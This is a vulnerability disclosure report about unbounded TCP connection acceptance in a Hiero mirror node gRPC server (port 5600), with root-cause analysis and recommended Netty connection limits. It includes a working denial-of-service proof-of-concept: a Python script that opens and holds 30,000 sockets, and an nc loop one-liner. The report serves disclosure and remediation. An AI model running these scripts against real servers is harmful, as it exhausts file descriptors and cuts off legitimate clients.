### Title
Unbounded TCP Connection Acceptance in `grpcServerConfigurer()` Enables File Descriptor Exhaustion DoS

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures the Netty gRPC server with only a per-connection RPC call limit (`maxConcurrentCallsPerConnection`), but sets no cap on the total number of simultaneous TCP connections, no connection age/idle timeout, and no connection rate limiting. An unprivileged attacker can open tens of thousands of idle TCP connections to port 5600, each consuming one OS-level file descriptor, until the process hits its `ulimit` and can no longer accept any new connections, causing a complete denial of service for legitimate gRPC clients.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 28–35:
```java
@Bean
ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
        GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
    final var nettyProperties = grpcProperties.getNetty();
    return serverBuilder -> {
        serverBuilder.executor(applicationTaskExecutor);
        serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    };
}
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, lines 11–14:
```java
public class NettyProperties {
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

**Root cause:** `NettyServerBuilder` exposes `maxConnectionsTotal()`, `maxConnectionAge()`, `maxConnectionIdle()`, and `permitKeepAliveWithoutCalls()` — none of which are called. A grep across all `grpc/**/*.java` files for `maxConnectionAge|maxConnectionIdle|maxConnections|permitKeepAlive` returns zero matches, confirming no connection-level guard exists anywhere in the module.

**Exploit flow:**
1. Attacker opens a raw TCP socket to port 5600 and completes the HTTP/2 preface (or even just the TCP handshake — Netty accepts the FD at `accept()` time before the HTTP/2 handshake completes).
2. The connection is held open with no RPC calls sent; `maxConcurrentCallsPerConnection=5` is never triggered because it only fires when calls are made.
3. Attacker repeats with thousands of sockets from one or more source IPs.
4. Each accepted connection consumes one server-side file descriptor.
5. When the process FD count reaches the OS `ulimit` (commonly 65 536 for a JVM process), every subsequent `accept()` returns `EMFILE`; Netty logs the error and the listening socket stops accepting new connections.
6. All legitimate gRPC clients (including smart contract tooling querying `ConsensusService`/`NetworkService`) receive connection-refused or timeout errors.

**Why the existing check fails:** `maxConcurrentCallsPerConnection` is a per-stream multiplexing limit — it rejects a 6th *RPC call* on an already-established connection. It does not reject the *connection itself*, so an attacker who never sends any RPC calls is completely unaffected by this guard.

### Impact Explanation
The gRPC server becomes unable to accept any new TCP connections once FDs are exhausted. All clients — including those performing smart contract–related queries via `ConsensusService` or `NetworkService` — receive connection failures. The attack is a full application-layer DoS with no funds at direct risk, consistent with the Medium severity classification. Recovery requires either the attacker stopping, the OS reclaiming FDs (which requires the idle connections to be closed), or a pod restart.

### Likelihood Explanation
No authentication or prior relationship with the server is required. A single attacker machine with a standard TCP stack can open ~28 000 simultaneous connections (limited by the client's ephemeral port range, 28 232 ports by default on Linux). Two coordinated machines can exhaust a typical 65 536 FD limit. The attack is trivially scriptable (`for i in $(seq 1 30000); do nc -z <host> 5600 & done`), repeatable, and requires no special tooling or privileges. The only external barrier is network reachability to port 5600; in deployments where the GCP gateway is enabled, `maxRatePerEndpoint: 250` limits *request* throughput but does not limit raw TCP connection establishment rate.

### Recommendation
Add the following controls inside the `grpcServerConfigurer()` lambda:

```java
serverBuilder.maxConnectionAge(1, TimeUnit.HOURS);          // recycle long-lived connections
serverBuilder.maxConnectionAgeGrace(30, TimeUnit.SECONDS);  // graceful drain window
serverBuilder.maxConnectionIdle(5, TimeUnit.MINUTES);       // close idle connections
serverBuilder.permitKeepAliveWithoutCalls(false);           // reject keepalive-only connections
```

Additionally, expose a `maxConnectionsTotal` field in `NettyProperties` and call `serverBuilder.maxConnectionsTotal(nettyProperties.getMaxConnectionsTotal())` with a sensible default (e.g., 5 000). At the infrastructure layer, enforce a per-source-IP TCP connection rate limit at the load balancer or via a Kubernetes `NetworkPolicy` / `LimitRange`.

### Proof of Concept
```bash
# On an attacker machine with network access to port 5600:
python3 - <<'EOF'
import socket, time

HOST = "<grpc-server-ip>"
PORT = 5600
socks = []
for i in range(30000):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        socks.append(s)
        if i % 1000 == 0:
            print(f"Opened {i} connections")
    except Exception as e:
        print(f"Failed at {i}: {e}")
        break

print(f"Total open: {len(socks)}")
time.sleep(300)   # hold connections open
EOF

# On the server, observe FD exhaustion:
# cat /proc/<pid>/limits | grep "open files"
# ls /proc/<pid>/fd | wc -l   → approaches ulimit
# New legitimate gRPC connects will fail with EMFILE
```